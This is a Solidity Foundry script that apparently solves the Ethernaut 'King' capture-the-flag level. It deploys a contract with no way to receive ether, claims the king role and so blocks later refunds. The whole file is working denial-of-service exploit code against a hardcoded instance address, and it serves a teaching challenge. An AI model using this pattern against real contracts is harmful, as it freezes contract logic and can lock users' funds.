// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {King} from "src/King.sol";

contract DOS {
    King public target;
    constructor(King _target) payable {
        target = _target;
    }

    function trigger() external {
        (bool ok,) = address(target).call{value: address(target).balance}("");
        require(ok);
    }
}


contract Solve is Script {
    DOS dos;
    address instanceAddr = 0xcE9B38de0bE7e40e435C3DE27C822eAd116Cf448;
    King target = King(payable(instanceAddr));
    function run() external {
        vm.startBroadcast();
        dos = new DOS{value: address(target).balance}(target);
        dos.trigger();
        vm.stopBroadcast();
        require(address(dos) == target._king() , "failed");
    }
}